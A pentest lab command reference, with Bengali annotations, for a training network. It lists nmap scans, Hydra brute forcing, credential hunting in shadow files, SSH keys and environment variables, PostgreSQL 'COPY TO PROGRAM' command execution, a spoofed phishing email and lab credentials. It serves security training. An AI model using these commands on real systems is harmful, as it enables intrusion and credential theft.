# 🛠️ Network Pentest — Command Reference
> **Lab:** Nexus Global Enterprise | **Scope:** ACS Enterprise Network
> প্রতিটা tool এর lab-এ যা use হয়েছে + আরো কী কী করা যায়

---

## 📡 1. NMAP — Network Scanner

### Basic Scans
```bash
# সব TCP port scan (full scan)
nmap -p- <TARGET_IP>

# Version detection
nmap -sV <TARGET_IP>

# OS detection
nmap -O <TARGET_IP>

# Script + Version (aggressive)
nmap -sV -sC <TARGET_IP>

# Specific ports only
nmap -p 21,22,80,443,3306 <TARGET_IP>

# Fast scan (top 1000 ports)
nmap -F <TARGET_IP>

# Top 100 ports
nmap --top-ports 100 <TARGET_IP>
```

### UDP Scan
```bash
# UDP top 1000 (common)
sudo nmap -sU --top-ports 1000 <TARGET_IP>

# Specific UDP ports
sudo nmap -sU -p 53,161,500 <TARGET_IP>
```

### Output / Save
```bash
# XML format (xsltproc এ ব্যবহার হয়)
nmap -oX output.xml <TARGET_IP>

# All formats একসাথে
nmap -oA scan_result <TARGET_IP>

# Normal text
nmap -oN output.txt <TARGET_IP>
```

### HTML Report
```bash
xsltproc /usr/share/nmap/nmap.xsl output.xml -o report.html
python3 -m http.server 9999
# → http://<IP>:9999/report.html
```

### Useful NSE Scripts
```bash
# FTP anonymous check
nmap --script ftp-anon <TARGET_IP> -p 21

# SMB shares
nmap --script smb-enum-shares <TARGET_IP> -p 445

# SNMP info
nmap --script snmp-info <TARGET_IP> -p 161

# HTTP robots.txt
nmap --script http-robots.txt <TARGET_IP> -p 80

# PostgreSQL info
nmap --script pgsql-brute <TARGET_IP> -p 5432

# Telnet NTLM info
nmap --script telnet-ntlm-info <TARGET_IP> -p 23

# Vuln scan
nmap --script vuln <TARGET_IP>
```

### Timing & Stealth
```bash
# T1 (slowest, stealth) → T5 (fastest, noisy)
nmap -T4 <TARGET_IP>

# SYN scan (stealth, requires root)
sudo nmap -sS <TARGET_IP>

# Ping sweep (host discovery only)
nmap -sn 10.0.2.0/24
```

---

## 📁 2. FTP — File Transfer Protocol

### Basic Connection
```bash
ftp <TARGET_IP>
# Name: anonymous
# Password: <যেকোনো email, e.g., test@test.com>
```

### FTP Commands (ftp> prompt এ)
```bash
ls                          # directory list
ls -la                      # hidden files সহ
cd <directory>              # directory change
pwd                         # current directory
get <filename>              # একটা file download
mget *.txt                  # pattern দিয়ে multiple files
put <localfile>             # file upload (write access থাকলে)
mkdir <dirname>             # directory create
delete <filename>           # file delete
binary                      # binary mode (executables এর জন্য)
ascii                       # text mode
passive                     # passive mode toggle
bye / quit                  # disconnect
```

### One-liner Download
```bash
# wget দিয়ে anonymous FTP
wget -r ftp://anonymous:test@<TARGET_IP>/pub/

# curl দিয়ে
curl ftp://<TARGET_IP>/pub/README.txt -u anonymous:test
```

### Brute Force
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://<TARGET_IP>
```

---

## 🖥️ 3. SSH — Secure Shell

### Basic Connection
```bash
# Standard
ssh user@<TARGET_IP>

# Custom port
ssh user@<TARGET_IP> -p 2222

# Specific key
ssh -i ~/.ssh/id_rsa user@<TARGET_IP>

# Verbose (debug)
ssh -v user@<TARGET_IP>
```

### SSH Tunneling (Port Forwarding)
```bash
# Local forward: local:8080 → remote PostgreSQL
ssh -L 8080:10.0.3.20:5432 user@<BASTION_IP> -p 2222
# এরপর local এ: psql -h 127.0.0.1 -p 8080 -U nexus_admin

# Dynamic SOCKS proxy (সব traffic route করো)
ssh -D 1080 user@<TARGET_IP> -p 2222
# তারপর proxychains use করো

# Remote forward
ssh -R 9090:localhost:4444 user@<TARGET_IP>
```

### Post-Exploitation (SSH এ ঢোকার পরে)
```bash
whoami                      # current user
id                          # user + groups
hostname                    # machine name
uname -a                    # OS + kernel version
ip addr / ifconfig          # network interfaces
ip route                    # routing table
cat /etc/hosts              # host list
cat /etc/passwd             # users
cat /etc/shadow             # password hashes (root only)
ss -tulnp                   # open ports
ps aux                      # running processes
env                         # environment variables
history                     # command history
cat ~/.bash_history         # bash history
find / -name "*.conf" 2>/dev/null    # config files খোঁজা
find / -perm -4000 2>/dev/null       # SUID binaries (privesc)
sudo -l                     # sudo permissions
crontab -l                  # cron jobs
```

### SSH Key Operations
```bash
# Key generate করো
ssh-keygen -t rsa -b 4096

# Key copy (password-less login)
ssh-copy-id user@<TARGET_IP>

# Authorized keys দেখো
cat ~/.ssh/authorized_keys
cat ~/.ssh/known_hosts       # known hosts (pivot targets)
```

### Brute Force
```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<TARGET_IP>
hydra -l root -P wordlist.txt ssh://<TARGET_IP> -p 2222
```

---

## 📞 4. TELNET

### Basic Connection
```bash
telnet <TARGET_IP>
telnet <TARGET_IP> 23
```

### Telnet এ ঢোকার পরে
```bash
# SSH এর মতোই সব Linux command চলবে
whoami
cat /etc/hosts
ip route
netstat -tulnp
cat ~/.bash_history
```

### Wireshark দিয়ে Plaintext Capture
```bash
# Telnet সব data plaintext — sniff করা যায়
sudo wireshark &
# Filter: telnet
# Capture এ username + password দেখা যাবে
```

### Brute Force
```bash
hydra -l sysadmin -P /usr/share/wordlists/rockyou.txt telnet://<TARGET_IP>
medusa -h <TARGET_IP> -u sysadmin -P wordlist.txt -M telnet
```

---

## 📂 5. SMBCLIENT — SMB/Windows Share

### Share List
```bash
# Anonymous
smbclient -L //<TARGET_IP> -N
smbclient -L //<TARGET_IP> -U ""

# With credentials
smbclient -L //<TARGET_IP> -U username%password
```

### Share Connect
```bash
# Anonymous
smbclient //<TARGET_IP>/IT-Backups -N

# With credentials
smbclient //<TARGET_IP>/IT-Backups -U username%password
```

### SMB Commands (smb: \> prompt এ)
```bash
ls                          # directory list
cd <directory>              # navigate
get <filename>              # file download
mget *                      # সব files download
put <filename>              # file upload
mkdir <dirname>             # directory create
del <filename>              # file delete
recurse on                  # recursive mode on
prompt off                  # confirmation ছাড়া
mget *                      # recursive সব files
```

### Other SMB Tools
```bash
# CrackMapExec — SMB recon
crackmapexec smb <TARGET_IP>
crackmapexec smb <TARGET_IP> -u '' -p '' --shares

# Enum4linux — full SMB enumeration
enum4linux -a <TARGET_IP>

# LDAP anonymous bind (Active Directory)
ldapsearch -x -H ldap://<TARGET_IP> -b "dc=nexus,dc=internal"

# rpcclient (null session)
rpcclient -U "" <TARGET_IP> -N
```

### Brute Force
```bash
crackmapexec smb <TARGET_IP> -u users.txt -p passwords.txt
hydra -L users.txt -P passwords.txt smb://<TARGET_IP>
```

---

## 🐘 6. POSTGRESQL — Database

### Connect
```bash
# Remote connect
psql -h <TARGET_IP> -U nexus_admin -d nexus_prod

# Password environment variable দিয়ে
PGPASSWORD='mypassword' psql -h <TARGET_IP> -U nexus_admin -d nexus_prod

# Local socket
psql -U postgres
```

### PostgreSQL Commands (psql prompt এ)
```sql
-- Database list
\l

-- Tables list
\dt

-- Connect to database
\c database_name

-- Table structure
\d table_name

-- Current user
SELECT current_user;

-- Version
SELECT version();

-- সব tables
SELECT table_name FROM information_schema.tables WHERE table_schema='public';

-- Data dump
SELECT * FROM employees LIMIT 10;
SELECT * FROM payroll;
SELECT * FROM system_vault_keys;

-- Config files (superuser only)
SHOW data_directory;

-- RCE (superuser হলে!)
COPY (SELECT '') TO PROGRAM 'id > /tmp/pwned';
CREATE TABLE cmd(t text);
COPY cmd FROM PROGRAM 'whoami';
SELECT * FROM cmd;

-- Exit
\q
```

### Brute Force
```bash
hydra -l postgres -P wordlist.txt postgresql://<TARGET_IP>
nmap --script pgsql-brute -p 5432 <TARGET_IP>
```

---

## 🌐 7. CURL / HTTP — Web Recon & Attack

### Basic Requests
```bash
# GET
curl http://<TARGET_IP>/
curl http://<TARGET_IP>/robots.txt

# Headers দেখো
curl -I http://<TARGET_IP>/

# Verbose (full request/response)
curl -v http://<TARGET_IP>/

# Follow redirects
curl -L http://<TARGET_IP>/
```

### POST Request
```bash
# Form login
curl -X POST http://<TARGET_IP>/login \
  -d "username=admin&password=admin"

# JSON POST
curl -X POST http://<TARGET_IP>/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin"}'

# Cookie সহ
curl -b "session=abc123" http://<TARGET_IP>/admin
```

### API Testing
```bash
# Grafana anonymous API
curl -s http://<TARGET_IP>:3000/api/org
curl -s http://<TARGET_IP>:3000/api/health
curl -s http://<TARGET_IP>:3000/api/users -u admin:password

# MailHog API
curl -s http://<TARGET_IP>:8025/api/v1/messages
```

### Directory Bruteforce
```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
ffuf -u http://<TARGET_IP>/FUZZ -w /usr/share/wordlists/common.txt
nikto -h http://<TARGET_IP>
```

---

## 📡 8. SNMP — Simple Network Management Protocol

### SNMPwalk
```bash
# v2c community string 'public' দিয়ে (সবচেয়ে common)
snmpwalk -v2c -c public <TARGET_IP>

# Specific OIDs
snmpwalk -v2c -c public <TARGET_IP> 1.3.6.1.2.1.1    # System info
snmpwalk -v2c -c public <TARGET_IP> 1.3.6.1.2.1.2    # Interfaces
snmpwalk -v2c -c public <TARGET_IP> 1.3.6.1.2.1.4    # IP routing table
snmpwalk -v2c -c public <TARGET_IP> 1.3.6.1.2.1.6    # TCP connections
snmpwalk -v2c -c public <TARGET_IP> 1.3.6.1.4.1.77   # Windows users
```

### Community String Brute Force
```bash
onesixtyone -c /usr/share/wordlists/snmp.txt <TARGET_IP>
hydra -P /usr/share/wordlists/snmp.txt <TARGET_IP> snmp
```

### SNMPget
```bash
snmpget -v2c -c public <TARGET_IP> sysDescr.0
snmpget -v2c -c public <TARGET_IP> sysName.0
```

---

## 🔨 9. HYDRA — Password Brute Force

### Common Protocols
```bash
# SSH
hydra -l root -P rockyou.txt ssh://<TARGET_IP>
hydra -l root -P rockyou.txt ssh://<TARGET_IP> -p 2222

# FTP
hydra -l admin -P rockyou.txt ftp://<TARGET_IP>

# Telnet
hydra -l sysadmin -P rockyou.txt telnet://<TARGET_IP>

# HTTP Login Form
hydra -l admin -P rockyou.txt <TARGET_IP> http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials"

# SMB
hydra -l administrator -P rockyou.txt smb://<TARGET_IP>

# PostgreSQL
hydra -l postgres -P rockyou.txt postgresql://<TARGET_IP>

# RDP
hydra -l administrator -P rockyou.txt rdp://<TARGET_IP>
```

### Options
```bash
-l <user>          # single username
-L users.txt       # username list
-p <pass>          # single password
-P passwords.txt   # password list
-t 4               # threads (default 16)
-V                 # verbose (প্রতিটা attempt দেখাবে)
-f                 # first match এ stop
-o result.txt      # output save
```

---

## 🖧 10. BASH SCRIPT — Internal Network Recon

### Ping Sweep (Host Discovery)
```bash
# একটা subnet
for i in $(seq 1 254); do
  (ping -c1 -W1 10.0.2.$i &>/dev/null && echo "10.0.2.$i UP") &
done; wait

# Multiple subnets
for subnet in 10.0.2 10.0.3 10.0.4; do
  for i in $(seq 1 254); do
    (ping -c1 -W1 $subnet.$i &>/dev/null && echo "$subnet.$i UP") &
  done
done; wait
```

### Port Check (nmap ছাড়া)
```bash
# Specific ports check
for port in 21 22 23 80 443 445 3306 5432 8080; do
  (echo >/dev/tcp/10.0.3.20/$port) 2>/dev/null && echo "Port $port OPEN"
done

# একটা port subnet এ scan
for i in $(seq 1 254); do
  (echo >/dev/tcp/10.0.2.$i/22) 2>/dev/null && echo "10.0.2.$i:22 OPEN"
done
```

### Credential Hunt
```bash
# Env vars এ sensitive data
env | grep -iE "pass|secret|key|token|api|aws|db"

# Files এ password খোঁজা
grep -rn "password" /etc/ 2>/dev/null
grep -rn "password" /home/ 2>/dev/null
find / -name "*.env" 2>/dev/null
find / -name ".pgpass" 2>/dev/null
find / -name "id_rsa" 2>/dev/null
find / -name "*.sh" 2>/dev/null | xargs grep -l "password" 2>/dev/null

# Bash history + credentials
cat ~/.bash_history
cat ~/.ssh/id_rsa
cat ~/.pgpass
cat ~/.netrc
```

### One-liner Full Recon
```bash
echo "=== NETWORK ===" && ip route && \
echo "=== HOSTS ===" && cat /etc/hosts && \
echo "=== OPEN PORTS ===" && ss -tulnp && \
echo "=== HISTORY ===" && cat ~/.bash_history && \
echo "=== ENV ===" && env | grep -iE "pass|key|secret"
```

---

## 🐳 11. DOCKER — Container Interaction

### Container List (VPS host এ)
```bash
docker ps
docker ps -a                               # stopped containers সহ
docker ps --format "table {{.Names}}\t{{.Status}}\t{{.Ports}}"
```

### Container Shell
```bash
# bash
docker exec -it <container_name> bash

# sh (bash না থাকলে)
docker exec -it <container_name> sh

# Root হিসেবে
docker exec -u root -it <container_name> bash
```

### Container Info
```bash
docker logs <container_name>
docker logs -f <container_name>           # live logs
docker inspect <container_name> | grep -A 20 "Networks"
docker inspect <container_name> | grep -A 5 "Env"    # credentials!
```

---

## 📧 12. MAILHOG — Email Interception

### Web UI
```
http://<TARGET_IP>:8025
→ No authentication — সব email directly visible
→ Password resets, internal notifications দেখা যায়
```

### API
```bash
# সব messages
curl -s http://<TARGET_IP>:8025/api/v1/messages | python3 -m json.tool
```

### SMTP Test
```bash
swaks --to victim@nexus.internal --from attacker@evil.com \
  --server <TARGET_IP> --port 1025 \
  --body "Phishing email content"
```

---

## 📸 13. RTSP / IP CAMERA

### Stream Access
```bash
vlc rtsp://<TARGET_IP>:8554/live
vlc rtsp://<TARGET_IP>:8554/stream

# Screenshot
ffmpeg -i rtsp://<TARGET_IP>:8554/live -frames:v 1 screenshot.jpg
```

### Path Bruteforce
```bash
cameradar -t <TARGET_IP>

# Manual common paths
for path in live stream cam1 channel1 video main sub h264; do
  echo "Trying: $path" && timeout 2 vlc rtsp://<TARGET_IP>:8554/$path 2>/dev/null
done
```

---

## 🗺️ Quick Reference Table

| Tool | Protocol | Port | Primary Use |
|:---|:---|:---|:---|
| `nmap` | TCP/UDP | — | Port scan, version, scripts |
| `ftp` | FTP | 21 | File transfer, anonymous login |
| `telnet` | Telnet | 23 | Plaintext shell (legacy) |
| `ssh` | SSH | 22/2222 | Encrypted shell, tunneling, pivot |
| `smbclient` | SMB | 445 | Windows shares, credential files |
| `psql` | PostgreSQL | 5432 | Database, data dump, RCE |
| `curl` | HTTP/S | 80/443 | Web recon, API testing, SQLi |
| `snmpwalk` | SNMP/UDP | 161 | Network device info |
| `hydra` | Multi | — | Brute force any protocol |
| `docker exec` | — | — | Container shell access |
| `ping loop` | ICMP | — | Internal host discovery |
| `bash /dev/tcp` | TCP | — | Portless port scan |

---

## 🎯 This Lab — Attack Chain

```
BLACK-BOX (Internet → DMZ):
  nmap -sV -p- → 15+ open ports discovered
  ftp anonymous → /pub/internal_network_map.txt → full internal map
  curl /robots.txt → /admin-console/, /api/network/
  snmpwalk -v2c -c public → OS + hostname + interfaces
  telnet → dmz-mon-01 login (brute force: sysadmin/nexus123)
  MailHog :8025 → email inbox open (no auth)
  [BLOCKED] Portal SQLi, internal networks

           ↓ ↓ Gray-box Switch ↓ ↓

GRAY-BOX (Bastion → Internal):
  ssh devops-remote@IP -p 2222 → bastion shell
  ip route → 4 internal networks visible
  ping sweep 10.0.2.x + 10.0.3.x → all live hosts
  docker exec nexus-pc-dev-01 → bash_history → DB creds
  smbclient //10.0.2.10/IT-Backups -N → sync_prod_db.sh → DB + MinIO pass
  psql → system_vault_keys → FLAG + SWIFT + AWS keys
  Browser /login → SQLi → FLAG + user dump
  Browser ping tool → CMDi → uid=0(root)
  Browser :3000 → Grafana admin (nexus_nms_admin/NMS@Nexus2026!)
  Browser :9001 → MinIO admin (nexus_san_root/SuperS3cUr3...)
```
